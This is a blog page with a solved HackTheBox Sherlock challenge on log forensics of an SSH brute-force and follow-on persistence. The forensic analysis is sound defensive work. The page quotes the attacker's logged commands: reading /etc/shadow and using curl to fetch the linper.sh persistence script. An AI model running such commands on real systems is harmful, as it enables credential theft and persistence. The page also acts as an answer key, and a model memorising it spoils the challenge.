@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx's Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/sherlocks/brutus/"><!-- Primary Meta Tags --><title>Brutus · Zumpyx&#39;s Blog</title><meta name="description" content="在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨一个场景，即 Confluence 服务器通过其 SSH 服务被暴力破解。在获得对服务器的访问权限后，攻击者执行了其他活动，我们可以使用auth.log跟踪这些活动。虽然auth.log主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见…"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/sherlocks/brutus/"><meta property="og:title" content="Brutus · Zumpyx's Blog"><meta property="og:description" content="在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨一个场景，即 Confluence 服务器通过其 SSH 服务被暴力破解。在获得对服务器的访问权限后，攻击者执行了其他活动，我们可以使用auth.log跟踪这些活动。虽然auth.log主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见…"><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/sherlocks/brutus/"><meta name="twitter:title" content="Brutus · Zumpyx's Blog"><meta name="twitter:description" content="在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨一个场景，即 Confluence 服务器通过其 SSH 服务被暴力破解。在获得对服务器的访问权限后，攻击者执行了其他活动，我们可以使用auth.log跟踪这些活动。虽然auth.log主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见…"><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}.meta .badge.locked{color:var(--medium,#fc0);background:#ffcc001a;border-color:#ffcc0059}
+</style><link rel="stylesheet" href="/_astro/ArticleLayout.DA3idRZl.css"><style>.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx&#39;s Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-06-18T00:00:00.000Z">2024-06-18</time></div><div class="title-row" data-astro-cid-sgg5joot><h1 data-astro-cid-sgg5joot>Brutus</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Sherlocks</span><span class="badge difficulty-very-easy" data-astro-cid-twh6cqtg>Very Easy</span><span class="badge" data-astro-cid-twh6cqtg>dfir</span><span class="badge" data-astro-cid-twh6cqtg>auth-logs</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/sherlocks/" data-astro-cid-twh6cqtg>← Sherlocks</a></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h1 id="brutus">Brutus</h1>
+<p><img alt="Pasted-image-20240617145652.png" loading="lazy" decoding="async" width="800" height="800" src="/_astro/Pasted-image-20240617145652.PDU0jtkD_Z24ibvO.webp" srcset=""></p>
+<blockquote>
+<p>Engage in thrilling investigative challenges that test your defensive security skills. With Sherlocks you will be asked to dive into the aftermath of a targeted cyber attack and unravel the dynamics behind them, based on the knowledge provided. Ready to start the investigation?</p>
+</blockquote>
+<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨一个场景，即 Confluence 服务器通过其 SSH 服务被暴力破解。在获得对服务器的访问权限后，攻击者执行了其他活动，我们可以使用auth.log跟踪这些活动。虽然auth.log主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
+<h2 id="任务列表">任务列表</h2>
+<h3 id="1分析authlog您能否识别攻击者用于进行暴力攻击的-ip-地址">1、分析auth.log，您能否识别攻击者用于进行暴力攻击的 IP 地址？</h3>
+<blockquote>
+<p>Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>65.2.161.68</span></span></code></pre>
+<h3 id="2-暴力尝试成功攻击者获得了对服务器上帐户的访问权限这个账户的用户名是什么">2 、暴力尝试成功，攻击者获得了对服务器上帐户的访问权限。这个账户的用户名是什么？</h3>
+<blockquote>
+<p>The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root</span></span></code></pre>
+<h3 id="3您能否识别攻击者手动登录服务器以执行其目标时的时间戳">3、您能否识别攻击者手动登录服务器以执行其目标时的时间戳？</h3>
+<blockquote>
+<p>Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>2024-03-06 06:32:45</span></span></code></pre>
+<h3 id="4ssh-登录会话在登录时被跟踪并分配一个会话编号问题-2-中分配给攻击者用户帐户会话的会话号是多少">4、SSH 登录会话在登录时被跟踪并分配一个会话编号。问题 2 中分配给攻击者用户帐户会话的会话号是多少？</h3>
+<blockquote>
+<p>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>37</span></span></code></pre>
+<h3 id="5攻击者在服务器上添加了一个新用户作为其持久性策略的一部分并授予该新用户帐户更高的权限这个账户叫什么名字">5、攻击者在服务器上添加了一个新用户作为其持久性策略的一部分，并授予该新用户帐户更高的权限。这个账户叫什么名字？</h3>
+<blockquote>
+<p>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>cyberjunkie</span></span></code></pre>
+<h3 id="6用于持久性的-mitre-attck-子技术-id-是什么">6、用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</h3>
+<blockquote>
+<p>What is the MITRE ATT&amp;CK sub-technique ID used for persistence?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>T1136.001</span></span></code></pre>
+<h3 id="7根据先前确认的身份验证时间和会话在authlog内结束攻击者的第一个-ssh-会话持续了多长时间秒">7、根据先前确认的身份验证时间和会话在auth.log内结束，攻击者的第一个 SSH 会话持续了多长时间？（秒）</h3>
+<blockquote>
+<p>How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>279</span></span></code></pre>
+<h3 id="8攻击者登录了他们的后门帐户并利用他们的更高权限下载了脚本使用-sudo-执行的完整命令是什么">8、攻击者登录了他们的后门帐户，并利用他们的更高权限下载了脚本。使用 sudo 执行的完整命令是什么？</h3>
+<blockquote>
+<p>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></span></code></pre>
+<h2 id="分析">分析</h2>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.</span></span>
+<span class="line"><span>├── Brutus.zip</span></span>
+<span class="line"><span>├── auth.log</span></span>
+<span class="line"><span>└── wtmp</span></span></code></pre>
+<p>在 Linux auth.log 日志文件中，登录失败会有 <code>authentication failure</code> 格式的日志。</p>
+<p><img alt="Pasted-image-20240617152118.png" loading="lazy" decoding="async" width="2046" height="469" src="/_astro/Pasted-image-20240617152118.CuTIHnBs_1MwUN1.webp" srcset=""></p>
+<p>登录爆破的攻击者 IP 为 <code>65.2.161.68</code>，登录成功会有 <code>Accepted password for [user] ...</code> 格式的日志</p>
+<p><img alt="Pasted-image-20240617152036.png" loading="lazy" decoding="async" width="1459" height="123" src="/_astro/Pasted-image-20240617152036.CXJofaeR_14IM4j.webp" srcset=""></p>
+<p>因此，爆破成功的是 <code>root</code> 用户，auth.log 会记录登录与登出的信息，因此搜索登陆成功前后的日志</p>
+<p><img alt="Pasted-image-20240617152339.png" loading="lazy" decoding="async" width="1602" height="334" src="/_astro/Pasted-image-20240617152339.C0hFvMGA_Z23B8Q2.webp" srcset=""></p>
+<p>第一次登录 root 用户时，同一时间断开连接，很显然是工具爆破，第二次登陆时操作五分钟后断开连接，因此时间为：<code>Mar  6 06:32:44</code></p>
+<p><img alt="Pasted-image-20240617153840.png" loading="lazy" decoding="async" width="1354" height="322" src="/_astro/Pasted-image-20240617153840.Cjk8Dpzs_1rB50J.webp" srcset=""></p>
+<p>但是对比用户在线信息可以看到时间有偏差，攻击者登录进来的时间是 <code>32:45</code>，组合一下，正确答案应该是：<code>2024-03-06 06:32:45</code></p>
+<p>查看登录时间附近的日志，可以找到分配到的会话号</p>
+<p><img alt="Pasted-image-20240617154741.png" loading="lazy" decoding="async" width="1608" height="390" src="/_astro/Pasted-image-20240617154741.C5XpBrfF_Z1yR0AV.webp" srcset=""></p>
+<p>攻击者 IP 在登出 root 账户后，以 <code>cyberjunkie</code> 用户登录</p>
+<p><img alt="Pasted-image-20240617154843.png" loading="lazy" decoding="async" width="1606" height="339" src="/_astro/Pasted-image-20240617154843.CyGbt5er_ZMF7oN.webp" srcset=""></p>
+<p>因此添加的新用户账户为：<code>cyberjunkie</code>，这个持久化操作是创建本地用户</p>
+<p><img alt="Pasted-image-20240617162535.png" loading="lazy" decoding="async" width="1842" height="700" src="/_astro/Pasted-image-20240617162535.Ci9KQAS4_Z1jEFWd.webp" srcset=""></p>
+<p>对应 MITRE ATT&amp;CK 子技术 ID：<code>T1136.001</code></p>
+<p>攻击者的第一个 SSH 会话持续时间为 06:32:44 - 06:37:24 共计 280 秒</p>
+<p><img alt="Pasted-image-20240618084520.png" loading="lazy" decoding="async" width="1639" height="201" src="/_astro/Pasted-image-20240618084520.BzX1TE6R_Z263jJ4.webp" srcset=""></p>
+<p>但是提交的答案并不对，猜测是时间有误差，再看一下用户在线信息日志</p>
+<p><img alt="Pasted-image-20240618084616.png" loading="lazy" decoding="async" width="1336" height="382" src="/_astro/Pasted-image-20240618084616.CwTLY_Yq_Z2tVJ3v.webp" srcset=""></p>
+<p>在线用户日志中的会话持续时间为 01:32:45 - 01:37:24 共计 <code>279</code> 秒</p>
+<p>攻击者在登录后门账户后的行为可以过滤登录 cyberjun 用户的时间查看</p>
+<p><img alt="Pasted-image-20240618085014.png" loading="lazy" decoding="async" width="2511" height="108" src="/_astro/Pasted-image-20240618085014.CZLYycgN_ZcPOSM.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">/usr/bin/cat</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> /etc/shadow</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">/usr/bin/curl</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span></span></code></pre>
+<p>因此执行脚本的命令为 <code>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</code></p>
+<h2 id="hints">Hints</h2>
+<ol>
+<li>Searching for keywords associated with brute force attempts may help in identifying potential attacks.</li>
+<li>Look for keywords indicating successful login attempts to identify the compromised account.</li>
+<li>It’s important to note that the first successful login by the attacker was the result of an automated brute force attempt, and the session was closed within the same second it was established. After obtaining the working credentials, the attacker manually logged in, and we need to identify that login. Use the wtmp artifact to view the login time of the working session and correlate that with auth.log.</li>
+<li>A session number is assigned immediately after the password is accepted.</li>
+<li>Auth.log also tracks changes related to users and groups on the server. Look for keywords indicating user additions or privilege assignments.</li>
+<li>If you have found the answer to Question 5, consult the MITRE ATT&amp;CK enterprise matrix to determine the sub-technique ID under the persistence tactic.</li>
+<li>We previously identified the session number in Question 4. Using that session number, search for keywords indicating session duration.</li>
+<li>Although auth.log is not typically used to track command executions like auditd, commands executed with sudo are logged in auth.log since the system needs to authenticate the account’s privileges to grant root level permissions for that command. Search for the keyword “COMMAND” to find commands executed using sudo.</li>
+</ol>
+</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=null;function n(){let n=document.querySelector(`[data-article-content]`),r=document.querySelector(`[data-toc]`),i=document.querySelector(`[data-toc-nav]`);if(!n||!r||!i)return;t?.disconnect(),t=null,i.replaceChildren();let a=Array.from(n.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(a.length===0){r.hidden=!0;return}r.hidden=!1;let o=new Set,s=[];for(let t of a){let n=t.id;if(!n){let r=e(t.textContent??``);n=r;let i=2;for(;o.has(n)||document.getElementById(n);)n=`${r}-${i}`,i+=1;t.id=n}o.add(n);let r=document.createElement(`a`);r.href=`#${n}`,r.textContent=(t.textContent??``).trim(),r.className=t.tagName===`H3`?`toc-h3`:`toc-h2`,r.dataset.target=n,i.appendChild(r),s.push(r)}let c=e=>{for(let t of s)t.classList.toggle(`active`,t.dataset.target===e)};t=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&c(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of a)t.observe(e);location.hash?c(decodeURIComponent(location.hash.slice(1))):a[0]&&c(a[0].id)}n(),document.addEventListener(`article-content-unlocked`,()=>{n()});</script></body></html>
